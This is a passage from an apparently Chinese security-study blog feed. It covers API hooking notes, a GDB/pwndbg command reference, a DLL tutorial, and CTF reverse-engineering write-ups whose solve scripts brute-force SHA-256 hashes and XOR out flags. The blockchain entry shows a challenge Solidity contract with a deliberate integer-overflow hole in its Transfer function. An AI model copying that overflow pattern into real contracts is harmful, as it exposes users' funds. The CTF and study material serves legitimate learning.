title="0x16-API钩取"></a>0x16-API钩取</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650003507541.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650003531886.png" alt="钩取流程"></p><p>因为在用户模式下要访问系统资源时，我们没有办法直接访问到，所以为了运行实际的应用程序代码，需要加载许多系统库，也就是DLL</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650003724601.png" alt="用户代码访问系统资源"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650003764098.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650003805976.png"></p><p>实际就是对API调用时进行钩取，获得控制权</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650004065936.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650004108572.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650004149588.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650004326551.png" alt="实现API钩取的方法"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650004361901.png"></p><h1 id="0x17-记事本WriteFIle-API钩取"><a href="#0x17-记事本WriteFIle-API钩取" class="headerlink" title="0x17-记事本WriteFIle()API钩取"></a>0x17-记事本WriteFIle()API钩取</h1>]]></content>
      
      
      
        <tags>
            
            <tag> Book </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BlockChain</title>
      <link href="/2022/04/06/BlockChain/"/>
      <url>/2022/04/06/BlockChain/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-环境配置"><a href="#0x00-环境配置" class="headerlink" title="0x00-环境配置"></a>0x00-环境配置</h1><p><a href="https://www.cnblogs.com/KRDecad3/p/10798383.html">https://www.cnblogs.com/KRDecad3/p/10798383.html</a></p><p>Rinkeby获取测试币网站</p><p><a href="https://faucets.chain.link/rinkeby">https://faucets.chain.link/rinkeby</a></p><p>其他的获取都没啥问题，选择购买-&gt;第二个即可</p><p><img src="/2022/04/06/BlockChain/1649249439831.png"></p><h1 id="0x01-基础使用"><a href="#0x01-基础使用" class="headerlink" title="0x01-基础使用"></a>0x01-基础使用</h1><p>可以本地化安装，也可以使用在线网站 <a href="http://remix.ethereum.org/">http://remix.ethereum.org</a> </p><h2 id="0x00-创建文件"><a href="#0x00-创建文件" class="headerlink" title="0x00-创建文件"></a>0x00-创建文件</h2><p>按照如下操作创建新文件，名称后缀为.sol</p><p><img src="/2022/04/06/BlockChain/1649250592024.png"></p><h2 id="0x01-源码编译"><a href="#0x01-源码编译" class="headerlink" title="0x01-源码编译"></a>0x01-源码编译</h2><p>源代码</p><pre class="language-solidity" data-language="solidity"><code class="language-solidity">pragma solidity ^0.4.23;contract Trans{        string flag;    mapping(address =&gt; uint256) balances;    constructor () public {        //flag = WHAT_YOU_WANT;    }        function getBalance() public returns (bool){        balances[msg.sender] = 100;        return true;    }        function showBalance() public view returns (uint256){        return balances[msg.sender];    }        function Transfer(address[] _addr, uint256 _value) public returns (bool){        uint times = _addr.length;        uint256 amount = uint256(times) * _value;        require(_value &gt; 0 &amp;&amp; balances[msg.sender] &gt;= amount);        require(times &gt; 0 &amp;&amp; times &lt; 10);        balances[msg.sender] -= amount;        for(uint i = 0; i &lt; times; i++){            balances[_addr[i]] += _value;        }        return true;    }        function getFlag() public view returns (string){        require(balances[msg.sender] &gt; 9999999);        return flag;    }}</code></pre><p>一些说明</p><p>我们选择的COMPILER需要和题目的源码的版本一致</p><p><img src="/2022/04/06/BlockChain/1649250475741.png"></p><p>然后我选择了自动编译</p><h2 id="0x02-配置题目合约"><a href="#0x02-配置题目合约" class="headerlink" title="0x02-配置题目合约"></a>0x02-配置题目合约</h2><p><img src="/2022/04/06/BlockChain/1649251440698.png" alt="一些说明"></p><p>弄好之后点击Deploy即可，然后他会连接并让我们确认支付</p><p>然后这些就是函数</p><p><img src="/2022/04/06/BlockChain/1649251873154.png"></p><h1 id="0x02-刷题网站"><a href="#0x02-刷题网站" class="headerlink" title="0x02-刷题网站"></a>0x02-刷题网站</h1><p><a href="https://chainflag.org/challenges">https://chainflag.org/challenges</a></p><p>因为智能合约基本是solidity语法，所以需要学习一下</p><p><a href="https://www.jianshu.com/p/70aecda3212e">https://www.jianshu.com/p/70aecda3212e</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> BlockChain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN基本工具</title>
      <link href="/2022/04/06/PWN%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7/"/>
      <url>/2022/04/06/PWN%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-GDB工具安装"><a href="#0x00-GDB工具安装" class="headerlink" title="0x00-GDB工具安装"></a>0x00-GDB工具安装</h1><p><a href="https://zhuanlan.zhihu.com/p/129837931">https://zhuanlan.zhihu.com/p/129837931</a></p><p>gdb这三个插件不能同时运行，可以使用命令</p><pre class="language-none"><code class="language-none">vim ~/.gdbinit</code></pre><p><img src="/2022/04/06/PWN%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7/1649212326580.png" alt="gdbinit"></p><p>不需要使用哪个就注释掉哪个</p><h1 id="0x01-GDB基本使用"><a href="#0x01-GDB基本使用" class="headerlink" title="0x01-GDB基本使用"></a>0x01-GDB基本使用</h1><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>首先先使用gcc生成elf文件，-g表示可以debug</p><pre class="language-none"><code class="language-none">gcc inputfile -o outputfile -g</code></pre><p>使用下面命令打开</p><pre class="language-none"><code class="language-none">gdb file</code></pre><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p><a href="https://blog.csdn.net/Breeze_CAT/article/details/103789233">https://blog.csdn.net/Breeze_CAT/article/details/103789233</a></p><p><a href="https://www.cnblogs.com/zhwer/p/12494317.html">https://www.cnblogs.com/zhwer/p/12494317.html</a></p><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><pre class="language-c" data-language="c"><code class="language-c">help//帮助i//infoi b//info break查看所有断点信息i r//info registers 查看各个寄存器当前的值i f//info function 查看所有函数名，保留符号show //和info相似，但是是查看调试器的基本信息show args//查看参数backtrace//查看调用堆栈q//quit退出</code></pre><h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><pre class="language-c" data-language="c"><code class="language-c">s//step，单步步入，跟进函数中，也就是step into，源码层面的一步，F7si//同s，汇编层面的一步n//next，单步补过，F8，源码层面的一步ni//同n，汇编层面的一步c//continue，F9，继续执行到断点r//run，重新开始执行</code></pre><h3 id="断点指令-break"><a href="#断点指令-break" class="headerlink" title="断点指令-break"></a>断点指令-break</h3><pre class="language-c" data-language="c"><code class="language-c">b*(0x123456)//给0x123456地址的指令下断点b*$rebase(0x123456)//$rebase在调试开PIE的程序的时候可以直接加上程序的随即地址b func_name//给函数func_name下断点，目标文件要保留符号才行    b file_name:func_nameb file_name:15//给file_name的15行下断点，需要有源码    b 15b +0x10//在程序当前停住的位置下0x10的位置下断点，也可以-0x10，就是前0x10break fun if $rdi==5//条件断点，rdi的值为5的时候才断</code></pre><p>删除、禁用断点的指令</p><pre class="language-c" data-language="c"><code class="language-c">//先使用i b查看断点编号delete 5//删除5号断点，如果直接delete不加数字，表示删除所有断点disable 5//禁用5号断点    enable 5//启用5号断点clear//清除下面的所有断点</code></pre><p>内存断点指令</p><pre class="language-c" data-language="c"><code class="language-c">watch 0x123456//0x123456地址的数据改变的时候会断watch a//变量a改变的时候会断info watchpoints//查看watch断点信息</code></pre><h3 id="打印指令"><a href="#打印指令" class="headerlink" title="打印指令"></a>打印指令</h3><p>查看内存指令x</p><pre class="language-c" data-language="c"><code class="language-c">x /nuf 0x123456//x指令的格式是：x /nfu，nfu代表三个参数    n//代表显示几个单元（而不是显示几个字节，后面的u表示一个单元多少个字节），放在'/'后面    u//代表一个单元几个字节，b(一个字节),h(两个字节)，w(四字节)，g(八字节)    f//代表显示数据的格式，f和u的顺序可以互换，也可以只有一个或者不带n    x 按十六进制格式显示变量。d 按十进制格式显示变量。u 按十六进制格式显示无符号整型。o 按八进制格式显示变量。        t 按二进制格式显示变量。        a 按十六进制格式显示变量。        c 按字符格式显示变量。        f 按浮点数格式显示变量。        s 按字符串显示。        b 按字符显示。        i 显示汇编指令。x /10gx 0x123456//从0x123456开始每个单元八个字节，十六进制显示十个单元的数据x /10xd $rdi//从rdi指向的地址向后打印十个单元，每个单元四字节的十进制数x /10i 0x123456//从0x123456处向后显示十条汇编指令</code></pre><p>打印指令p(print)</p><pre class="language-c" data-language="c"><code class="language-c">p func_name//打印func_name的地址，需要保留符号p 0x10-0x8//计算0x10-0x8的结果p &amp;a//查看变量a的地址p *(0x123456)//查看0x123456的值p $rdi//显示rdi寄存器的值    p *($rdi)//显示rdi指向的值</code></pre><p>打印汇编指令disass(disassemble)</p><pre class="language-c" data-language="c"><code class="language-c">disass 0x123456//显示0x123456前后的汇编指令x /10i //前面说过了</code></pre><p>打印源代码list</p><pre class="language-c" data-language="c"><code class="language-c">list//查看当前附近10行的代码    list 38//查看28行附近10行的代码    list 1,10//查看1-10行代码    list main//查看main函数的开始10行</code></pre><h3 id="查找指令"><a href="#查找指令" class="headerlink" title="查找指令"></a>查找指令</h3><pre class="language-c" data-language="c"><code class="language-c">search rdi//从当前位置向后查找包含rdi的指令find "hello"//查找hello字符串，pwndbg独有</code></pre><h3 id="修改数据指令-set"><a href="#修改数据指令-set" class="headerlink" title="修改数据指令-set"></a>修改数据指令-set</h3><pre class="language-c" data-language="c"><code class="language-c">set $rdi=0x10//把寄存器的值变为0x10set *(0x123456)=0x10//把0x123456地址的值变为0x10，注意带星号set args "abc" "def" "gh"//给参数123赋值</code></pre><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><pre class="language-c" data-language="c"><code class="language-c">堆操作指令（pwndbg插件独有）arena //显示arena的详细信息arenas //显示所有arena的基本信息arenainfo //好看的显示所有arena的信息bins //常用，查看所有种类的堆块的链表情况fastbins //单独查看fastbins的链表情况largebins //同上，单独查看largebins的链表情况smallbins //同上，单独查看smallbins的链表情况unsortedbin //同上，单独查看unsortedbin链表情况tcachebins //同上，单独查看tcachebins的链表情况tcache //查看tcache详细信息heap //数据结构的形式显示所有堆块，会显示一大堆heapbase //查看堆起始地址heapinfo、heapinfoall //显示堆得信息，和bins的挺像的，没bins好用parseheap //显示堆结构，很好用tracemalloc //好用，会跟提示所有操作堆的地方其他pwndbg插件独有指令cyclc 50 //生成50个用来溢出的字符，如：aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama$reabse //开启PIE的情况的地址偏移b *$reabse(0x123456) //断住PIE状态下的二进制文件中0x123456的地方codebase //打印PIE偏移，与rebase不同，这是打印，rebase是使用stack //查看栈retaddr //打印包含返回地址的栈地址canary //直接看canary的值plt //查看plt表got //查看got表hexdump //像IDA那样显示数据，带字符串</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态链接库创建与使用</title>
      <link href="/2022/04/04/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E5%88%9B%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
      <url>/2022/04/04/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E5%88%9B%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-参考文章"><a href="#0x00-参考文章" class="headerlink" title="0x00-参考文章"></a>0x00-参考文章</h1><p><a href="https://blog.csdn.net/LyRics1996/article/details/120246497">https://blog.csdn.net/LyRics1996/article/details/120246497</a></p><h1 id="0x01-创建动态链接库"><a href="#0x01-创建动态链接库" class="headerlink" title="0x01-创建动态链接库"></a>0x01-创建动态链接库</h1><p>下面以VS为例</p><p>在创建新项目找到动态链接库DLL</p><p><img src="/2022/04/04/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E5%88%9B%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8/1649068184192.png"></p><p>创建之后是这样的</p><p><img src="/2022/04/04/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E5%88%9B%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8/1649068250968.png"></p><p>替换成我们待会要调用的函数</p><p><img src="/2022/04/04/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E5%88%9B%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8/1649070264273.png" alt="替换之后"></p><p>之所以要在函数前面加上extern “C” __declspec(dllexport)</p><p>是因为在导出的时候可能会增加一些符号，这样的话函数的名称会被修改，待会GetProcAddress就无法调用了</p><p><img src="/2022/04/04/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E5%88%9B%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8/1649070418832.png" alt="说明"></p><h1 id="0x03-调用动态链接库"><a href="#0x03-调用动态链接库" class="headerlink" title="0x03-调用动态链接库"></a>0x03-调用动态链接库</h1><p>首先先要加载动态链接库，使用LoadLibrary，有两种方式</p><pre class="language-c" data-language="c"><code class="language-c">handle = LoadLibrary(L"Dll1.dll");handle = LoadLibrary(_TEXT("D:\\new\\AD\\C语言\\Dll1\\Debug\\Dll1.dll"));</code></pre><p>使用下面这种方式的话需要#include&lt;tcahr.h&gt;</p><p>GetProcAddress调用DLL文件中的函数</p><p>我们需要使用typedef为函数指针创建匹配类型的指针</p><p>因为函数名就是函数的地址，所以可以直接赋值和调用，下面两种都可以调用函数，震惊！C语言白学了</p><p><img src="/2022/04/04/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E5%88%9B%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8/1649072130088.png"></p><p>代码如下</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;#include&lt;Windows.h&gt;#include&lt;string.h&gt;#include&lt;iostream&gt;#include &lt;tchar.h&gt;typedef int(*Lpfunc)(int a,int b);//先定义函数指针int main(){HMODULE handle;handle = LoadLibrary(L"Dll1.dll");handle = LoadLibrary(_TEXT("Dll1.dll"));Lpfunc add = NULL;add = (Lpfunc)GetProcAddress(handle, "add");printf("%d\n", add(3, 4));FreeLibrary(handle);//释放资源return 0;}</code></pre><p>typedef声明函数指针</p><p><a href="https://blog.csdn.net/afei__/article/details/82011613">https://blog.csdn.net/afei__/article/details/82011613</a></p><p>当然我们也可以多层调用</p><p>dll文件中</p><pre class="language-c" data-language="c"><code class="language-c">// dllmain.cpp : 定义 DLL 应用程序的入口点。#include "pch.h"#include&lt;stdio.h&gt;extern "C" _declspec (dllexport)void Print(int k){    printf("%d\n", k);}extern "C" _declspec (dllexport)int add(int a, char b){    int c = a + b;    Print(c);    return c;}</code></pre><p>python调用dll-ctype</p><p><a href="https://docs.python.org/3/library/ctypes.html">https://docs.python.org/3/library/ctypes.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> PE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>近期题目复现</title>
      <link href="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-Zer0pts2022-service"><a href="#0x00-Zer0pts2022-service" class="headerlink" title="0x00-Zer0pts2022-service"></a>0x00-Zer0pts2022-service</h1><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>先定位到正确的判断，进入加密函数</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649057498918.png"></p><p>可以看到有几个api函数，并且只有所有的值都相等，才能实现return的值为1</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649057543911.png"></p><p>但是动调的时候很多函数看不到，而且这里面有很多东西未被正确识别，所以使用X64DBG打开并定位到加密函数</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649057759455.png" alt="加密函数"></p><p>首先我们要知道x64的函数调用机制</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649057831750.png"></p><p>所以在call前的那几个mov就是函数的参数</p><p>先看循环的次数</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649057937520.png" alt="rbp-0x44"></p><p>很明显这段就是循环的判断</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649057978804.png" alt="循环判断"></p><p>循环内部，可以看到有三个api函数，先不管</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649058022189.png"></p><p>因为刚才在ida看到，最后是有一个比较的，我们先确定存储加密后字符串的位置，根据这个跳转和0x1F也就是31，确定这就是判断</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649058122264.png"></p><p>可以看到在这之前先把两个地址存放的一个byte放入edx和eax中，我们就可以定位过去，先运行到这</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649058190552.png" alt="关键判断"></p><p>可以看到，我们通过64FD80-0x40得到了存放加密字符串的地址，那么这一段就是循环判断</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649058453221.png"></p><p>接下来我们重新运行一下，然后这次我们先右键锁定堆栈，观察他的变化</p><p>先来看一下第一个API函数</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649058638150.png" alt="CryptCreateHash"></p><pre class="language-c" data-language="c"><code class="language-c">BOOL CryptCreateHash(  [in]  HCRYPTPROV hProv,  [in]  ALG_ID     Algid,  [in]  HCRYPTKEY  hKey,  [in]  DWORD      dwFlags,  [out] HCRYPTHASH *phHash);</code></pre><p>而前面的一些是函数的参数，关键的是下面这个，我们点进这个链接</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649058819510.png" alt="关键参数"></p><p>0x800C，和我们的参数对应上了，那么这个应该就是加密的方式</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649058866139.png"></p><p>再看第二个函数</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649058990852.png" alt="CryptHashData"></p><pre class="language-c" data-language="c"><code class="language-c">BOOL CryptHashData(  [in] HCRYPTHASH hHash,  [in] const BYTE *pbData,  [in] DWORD      dwDataLen,  [in] DWORD      dwFlags);</code></pre><p>关键是是我们加密的数据和数据的长度，也就是说每次取出2长度的字符串生成hashdata</p><p>再看第三个</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649059153629.png" alt="CryptGetHashParam"></p><pre class="language-c" data-language="c"><code class="language-c">BOOL CryptGetHashParam(  [in]      HCRYPTHASH hHash,  [in]      DWORD      dwParam,  [out]     BYTE       *pbData,  [in, out] DWORD      *pdwDataLen,  [in]      DWORD      dwFlags);</code></pre><p>具体的可以不用细看，只需知道这一段是真正的加密，因为在执行前，目标地址没有数据</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649059338076.png"></p><p>执行后</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649059375141.png"></p><p>所以整个过程就是将我们输入的每两位进行sha256加密，然后和他给我们的hash表进行表，那我们就可以先生成两字符的sha256彩虹表，然后反查</p><p>验证一下</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649059489991.png" alt="sha256表"></p><p>flag格式是zer0pts，取前两个字符进行sha256加密，正好对应</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649059547681.png"></p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-python" data-language="python"><code class="language-python">hash = [  "33129567e0bd787efb15a26307e5311e06ba66e3b8dbc2206ad59f99780a4d78",  "dd191696e15e2ee293410d02454c5f9461a2249dee6d57c75f264eaeb83a3782",  "e75b11da693d7bb5273985dcf9f02729455da7e7c80e54a0615e00ec2ae76d8e",  "04249e0c258e1a4e43cfdae291a835cd15735f650bbbba0465ada1cd9846622a",  "e4223ed20d7ea5740a326e2b268ca6db91d041cf5194f577e393a8ba3b85d8e9",  "8b53639f152c8fc6ef30802fde462ba0be9cf085f7580dc69efd72e002abbb35",  "0117834bf60dcf977229bf1e982cf9bc63b60ef42052f7ce7e800ce1216a9af6",  "741d14df730e53a5a019a710116f696db4ec23a132b74cf6fbb3cf7617e68313",  "e30e580a4c2916bcff30ca047f2d6a494168ceaf8fb9171037a773a9f8e7268e",  "294763754a8efd4c739d9f679bfca3ab510106f42ddb5dc0216ba8bc98ba3158",  "46c9e22099ee4bfe54a99a3cdbaf69f17f7c6e2581b92f7bab25128fd2100b7a",  "68dbf73d03d3a5107edad3b05676eee240e68c280296e52b6986873c54cef3cb",  "c1818d580d8c8bc111302f4a5e6903ef2d32b11a5613efba507693de8060fb8c",  "44ad63f60af0f6db6fdde6d5186ef78176367df261fa06be3079b6c80c8adba4",  "46c9e22099ee4bfe54a99a3cdbaf69f17f7c6e2581b92f7bab25128fd2100b7a",  "5e07d6fdc602b0f9b99f6ea24c39e65835992faac400264c52449bc409cf4efa",  "e4dcd6d313af71559596d3009c12d025301842d8c7f888c2850333e91a9bda68",  "fffdff4b07a9d973fd1c3a6be443851bc13e82c4af94c88325244694e352aa31",  "3fffd018d2223020be85670d93f565b63df54a9ce3ed2cdf6347a61df016938c",  "b2941852282562cc3d813e8bf1705d0480a7a008ffa2475501d7c5161165a7fb",  "635ca73d00d4f28b5f573b16eea56e9e4579d77e561c32aa68189d9769fa1753",  "a4d0ef23161b5b7c6a8d5b287543fd74e16b3bf313d71aa187c24cdd728a7b1e",  "e0b9a8799f32453a478c9122f8b83cee68e16db18f493ac81bc1d474594b5df4",  "564999cbbfea80170ba068dcf961d9914625f3be951b2c1fe163bae0f8156c24",  "4a44dc15364204a80fe80e9039455cc1608281820fe2b24f1e5233ade6af1dd5",  "e91787068a3c60e9712a7abeb6a67f518a40723c1b89c11d6070fe5f9389ebf9",  "7eb70257593da06f682a3ddda54a9d260d4fc514f645237f5ca74b08f8da61a6",  "96a296d224f285c67bee93c30f8a309157f0daa35dc5b87e410b78630a09cfc7",  "96a296d224f285c67bee93c30f8a309157f0daa35dc5b87e410b78630a09cfc7",  "96a296d224f285c67bee93c30f8a309157f0daa35dc5b87e410b78630a09cfc7",  "96a296d224f285c67bee93c30f8a309157f0daa35dc5b87e410b78630a09cfc7",  "96a296d224f285c67bee93c30f8a309157f0daa35dc5b87e410b78630a09cfc7",]import hashlibimport itertoolsdef dec(h):  for l in range(2,3):    for p in itertools.product(range(128), repeat=l):      if hashlib.sha256(bytes(p)).hexdigest()==h:        return bytes(p)flag = b""for h in hash:  flag += dec(h)print(flag.decode())</code></pre><p>zer0pts{m0d1fy1ng_PE_1mp0rts_1s_4n_34sy_0bfusc4t10n}</p><p><a href="https://www.cnblogs.com/xxxxxxxxx/p/11544432.html">https://www.cnblogs.com/xxxxxxxxx/p/11544432.html</a></p><p>这里介绍了itertools.product，其实目的就是生成2位字符的彩虹表，然后和密文对比</p><h1 id="SpaceHeroesCtf2022-Shai-Hulud"><a href="#SpaceHeroesCtf2022-Shai-Hulud" class="headerlink" title="SpaceHeroesCtf2022-Shai-Hulud"></a>SpaceHeroesCtf2022-Shai-Hulud</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00-前言"></a>0x00-前言</h2><p>比较有趣的一道题，当时专注于改源码搞定游戏，然后一直失败，主要是自己写的C语言生成的随机数和调试得到的不同（其实是没注意linux和windows生成随机数的不同），所以就想玩游戏得到flag</p><p>另外的解法</p><p><a href="https://breaking-bits.gitbook.io/breaking-bits/spaceheros-ctf-2022/re-shai-hulud">https://breaking-bits.gitbook.io/breaking-bits/spaceheros-ctf-2022/re-shai-hulud</a></p><h2 id="0x01-分析过程"><a href="#0x01-分析过程" class="headerlink" title="0x01-分析过程"></a>0x01-分析过程</h2><p>运行程序知道这是个贪吃蛇小游戏，通过不等于0x295判断这就是贪吃蛇长度，然后SHA256_Init可以看出这是sha256加密</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649148254617.png"></p><p>前面的一些函数就是生成地图，初始化游戏等操作</p><p>主要看下面这个函数，是随机生成需要吃掉的点的</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649148425600.png" alt="vibration"></p><p>这两个函数是一些规则，告诉你wasd是移动</p><p>主要看frame函数</p><p>下面这个函数是说不能碰到尾巴，继续往下看</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649148585642.png" alt="判定退出"></p><p>可以看到等于-2的时候，而-2刚好对应随机生产点函数的-2，然后对该值进行sha256加密，并且重新生成-2的点，然后长度+1</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649148702003.png"></p><p>所以我们接下来只需要跑到最后的长度即可得到最后的sha256加密值，然后在print_flag函数中，最后进行了一次异或</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649148830700.png" alt="print_flag"></p><p>本来修改好规则打算玩到0x294的，但是在长度为195的时候随机点找不到。所以只能老实做</p><p>在导入表可以看到SHA256_Init，SHA256_Update，SHA256_Final函数，可以知道调用了OPENSSL，版本为1.1.0</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649148953206.png" alt="导入表"></p><p>安装好之后，模仿该过程生成SHA256加密，注意因为每次都会Update，所以不能将最后一次生成的值直接SHA256加密，这样得到的结果不一样</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649153105553.png" alt="函数说明"></p><p>这也就是前面说的，每加密完一次，hash初始值都会被改变</p><pre class="language-c" data-language="c"><code class="language-c">#include &lt;openssl/sha.h&gt;#include &lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main(int argc, char const* argv[]){SHA256_CTX ctx;srand(0x2454);char output[256];__int64_t buffer;int x, y;SHA256_Init(&amp;ctx);for (int i = 0; i &lt; 0x294; ++i){x = rand() % 33;y = rand() % 20;buffer = 16 * x + y;SHA256_Update(&amp;ctx, &amp;buffer, 8);SHA256_Final(output, &amp;ctx);}for(int i = 0; i&lt;32; i++) //将SHA256以16进制输出{         printf("%02x", (int)output[i]&amp;0xff);    }     puts("\n");return 0;</code></pre><p>编译</p><blockquote><p>g++ -o openssl-sha256 openssl-sha256.c -std=c++11 -lssl -lcrypto</p></blockquote><p>也可以动调得到最后的sha256值</p><p>最后异或一下即可</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;string.h&gt;#include &lt;stdio.h&gt;int main(int argc, char const* argv[]){char data[33] = {0xC2, 0x98, 0xD1, 0x8E, 0xC8, 0xBF, 0x99, 0x75, 0x50, 0x41, 0x54, 0x5D, 0x3C, 0x39, 0xA8, 0x05,0x73, 0x7B, 0xDE, 0xEA, 0xA3, 0xBE, 0x4C, 0x40, 0x2B, 0xE2, 0x48, 0x90, 0x80, 0x7F, 0x7B, 0x8D };unsigned char magic_bytes[32] = {0xB2, 0xEA, 0xE5, 0xBF, 0xBB, 0x8C, 0xC6, 0x01, 0x38, 0x72, 0x0B, 0x2F, 0x0F, 0x54, 0x9C, 0x6E,0x40, 0x24, 0xEA, 0x84, 0xC7, 0xE1, 0x7D, 0x34, 0x58, 0xBD, 0x2E, 0xE2, 0xB4, 0x12, 0x48, 0xFE};for (int i = 0; i &lt; strlen(data); ++i){data[i] ^= magic_bytes[i];}printf("%s", data);return 0;}</code></pre><p><a 